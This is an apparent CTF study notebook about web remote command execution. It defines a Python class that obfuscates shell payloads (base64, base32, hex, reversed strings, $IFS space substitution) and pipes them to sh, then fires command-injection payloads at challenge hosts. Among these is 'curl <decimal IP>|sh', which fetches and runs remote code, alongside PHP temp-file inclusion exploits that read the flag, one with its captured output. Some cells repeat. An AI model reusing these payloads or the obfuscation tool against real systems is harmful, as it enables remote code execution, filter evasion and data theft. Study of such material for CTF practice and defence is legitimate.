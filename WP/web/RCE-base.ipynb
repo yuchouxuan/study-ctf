{
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "#### 绕过"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "import base64\n",
    "class linux_rce:\n",
    "    pl=\"\"\n",
    "    def __init__(self,strpl):\n",
    "        self.pl=strpl\n",
    "    def __str__(self):\n",
    "        return self.pl\n",
    "    def space(self,rep='$IFS$9'):\n",
    "        self.pl=self.pl.replace(' ',rep)\n",
    "        return self\n",
    "    def base64(self,run=\"|sh\"):\n",
    "        b64=base64.b64encode(self.pl.encode()).decode()\n",
    "        self.pl='echo '+b64+\"|base64 -d\"+run\n",
    "        return self\n",
    "    def base64_print(self,run=\"|sh\"):\n",
    "        b64=base64.b64encode(self.pl.encode()).decode()\n",
    "        self.pl='printf '+b64+\"|base64 -d\"+run\n",
    "        return self\n",
    "    def base32(self,run=\"|sh\"):\n",
    "        b64=base64.b32encode(self.pl.encode()).decode()\n",
    "        self.pl='echo '+b64+\"|base64 -d\"+run\n",
    "        return self\n",
    "    def base32_print(self,run=\"|sh\"):\n",
    "        b64=base64.b32encode(self.pl.encode()).decode()\n",
    "        self.pl='printf '+b64+\"|base64 -d\"+run\n",
    "        return self\n",
    "    def xxd(self,run=\"|sh\"):\n",
    "        b16 = base64.b16encode(self.pl.encode()).decode()\n",
    "        self.pl='echo '+b16+\"|xxd -r -p\"+run\n",
    "        return self\n",
    "    def xxd_print(self,run=\"|sh\"):\n",
    "        b16 = base64.b16encode(self.pl.encode()).decode()\n",
    "        self.pl='printf '+b16+\"|xxd -r -p\"+run\n",
    "        return self\n",
    "    def rev_print(self,run=\"|sh\",res='$IFS$9'):\n",
    "        self.pl=self.pl.replace(' ',res)[::-1].replace(\"$\", \"\\\\$\")\n",
    "        self.pl='printf '+self.pl+'|rev'+run\n",
    "        return self;"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "import requests\n",
    "url=\"http://10.101.0.8/?ip=localhost|\"\n",
    "\n",
    "pl = str(linux_rce('curl 174325978|sh').space())\n",
    "print(pl)\n",
    "print(requests.get(url+pl).text)\n",
    "\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "#### 临时文件包含"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "##### 2020省赛"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "import requests\n",
    "url=\"http://10.101.0.6/\"\n",
    "url+='?shell=?><?=`. /???/????????[@-[]`?>'\n",
    "files={'file':'cat /flag'}\n",
    "import tqdm \n",
    "for i in tqdm.trange(1000):\n",
    "    response=requests.post(url,files=files)\n",
    "    html = response.text\n",
    "    if len(html) > 0:\n",
    "        print(html)\n",
    "        break;\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "##### 七夕web1 临时文件"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "import requests \n",
    "url=\"http://e4cbf220-20d3-4447-9019-2e19a42dde51.challenge.ctf.show/\"\n",
    "files={'file':'cat /f* > /var/www/html/1.txt'}\n",
    "data={'cmd':\". /t*/*\"}\n",
    "requests.post(url+'/api/tools.php',data=data,files=files)\n",
    "requests.get(url+'1.txt').text"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "url=\"http://10.101.0.6/\"\n",
    "url+='?shell=?><?=`. /???/????????[@-[]`?>'\n",
    "files={'file':'cat /flag'}\n",
    "import tqdm \n",
    "for i in tqdm.trange(1000):\n",
    "    response=requests.post(url,files=files)\n",
    "    html = response.text\n",
    "    if len(html) > 0:\n",
    "        print(html)\n",
    "        break;\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "##### 七夕web1 临时文件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ctfshow{eba1d77e-111c-4855-90f7-41a1150efb8b}\\n'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests \n",
    "url=\"http://e4cbf220-20d3-4447-9019-2e19a42dde51.challenge.ctf.show/\"\n",
    "files={'file':'cat /f* > /var/www/html/1.txt'}\n",
    "data={'cmd':\". /t*/*\"}\n",
    "requests.post(url+'/api/tools.php',data=data,files=files)\n",
    "requests.get(url+'1.txt').text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}